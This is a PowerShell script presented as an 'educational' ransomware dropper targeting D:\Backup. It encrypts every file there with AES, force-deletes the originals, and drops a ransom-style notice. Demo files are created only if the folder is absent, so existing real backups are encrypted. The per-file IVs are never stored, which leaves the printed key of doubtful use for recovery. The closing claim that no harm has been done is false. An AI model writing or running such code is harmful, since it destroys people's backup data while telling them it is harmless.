# BACKUP FOLDER ENCRYPTION DROPPER - PowerShell Version
# Educational dropper that encrypts D:\Backup folder

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "   BACKUP FOLDER ENCRYPTION DROPPER" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow
Write-Host "Target: D:\Backup" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Yellow

# Function to encrypt backup folder
function Encrypt-BackupFolder {
    $targetDir = "D:\Backup"
    $extension = ".backup_locked"
    
    Write-Host "[STATUS] Checking target directory..." -ForegroundColor Green
    
    # Check if directory exists, create if not
    if (-not (Test-Path $targetDir)) {
        Write-Host "[INFO] Target directory not found, creating demo files..." -ForegroundColor Yellow
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        
        # Create demo files
        $demoFiles = @{
            "important_backup.txt" = "This is important backup data that should be protected"
            "family_photos.zip" = "Compressed family photos and memories"
            "work_documents.rar" = "Work-related documents and projects"
            "financial_records.xlsx" = "Bank statements and financial records"
        }
        
        foreach ($file in $demoFiles.GetEnumerator()) {
            $filePath = Join-Path $targetDir $file.Key
            $file.Value | Out-File -FilePath $filePath -Encoding UTF8
        }
        Write-Host "[INFO] Created demo files for testing" -ForegroundColor Green
    }
    
    Write-Host "[STATUS] Generating encryption key..." -ForegroundColor Green
    Start-Sleep -Seconds 1
    
    # Generate AES key
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.GenerateKey()
    $key = $aes.Key
    
    Write-Host "[TARGET] Encrypting files in $targetDir" -ForegroundColor Cyan
    
    $encryptedCount = 0
    $failedCount = 0
    
    # Get all files recursively
    $files = Get-ChildItem -Path $targetDir -File -Recurse | Where-Object {
        $_.Extension -ne $extension -and $_.Name -ne "BACKUP_ENCRYPTION_NOTICE.txt"
    }
    
    foreach ($file in $files) {
        try {
            Write-Host "[ENCRYPTING] $($file.Name)" -ForegroundColor Yellow
            
            # Read file content
            $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
            
            # Encrypt content
            $aes.GenerateIV()
            $encryptor = $aes.CreateEncryptor()
            $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
            
            # Create encrypted file
            $newFileName = $file.FullName + $extension
            [System.IO.File]::WriteAllBytes($newFileName, $encryptedContent)
            
            # Remove original file
            Remove-Item $file.FullName -Force
            
            $encryptedCount++
            Write-Host "  -> Successfully encrypted" -ForegroundColor Green
            
        } catch {
            Write-Host "  -> Failed to encrypt: $($_.Exception.Message)" -ForegroundColor Red
            $failedCount++
        }
    }
    
    # Create ransom note
    $noteContent = @"
================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: $targetDir
Files Encrypted: $encryptedCount
Extension Added: $extension

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"@
    
    $notePath = Join-Path $targetDir "BACKUP_ENCRYPTION_NOTICE.txt"
    $noteContent | Out-File -FilePath $notePath -Encoding UTF8
    
    Write-Host "[NOTE] Created educational notice: BACKUP_ENCRYPTION_NOTICE.txt" -ForegroundColor Cyan
    
    Write-Host "`n[COMPLETE] Encryption Results:" -ForegroundColor Green
    Write-Host "  - Successfully encrypted: $encryptedCount files" -ForegroundColor Green
    Write-Host "  - Failed to encrypt: $failedCount files" -ForegroundColor Yellow
    Write-Host "  - Extension used: $extension" -ForegroundColor Green
    
    # Display key for educational purposes
    $keyBase64 = [Convert]::ToBase64String($key)
    Write-Host "`n[KEY] Encryption Key (for recovery):" -ForegroundColor Magenta
    Write-Host $keyBase64 -ForegroundColor White
    
    Write-Host "`n⚠️  This is an educational simulation only!" -ForegroundColor Red
    Write-Host "⚠️  No actual harm has been done to your system." -ForegroundColor Red
}

# Main execution
try {
    Encrypt-BackupFolder
} catch {
    Write-Host "[ERROR] An error occurred: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`n========================================" -ForegroundColor Yellow
Write-Host "BACKUP FOLDER ENCRYPTION COMPLETE" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Yellow

Write-Host "`nPress any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")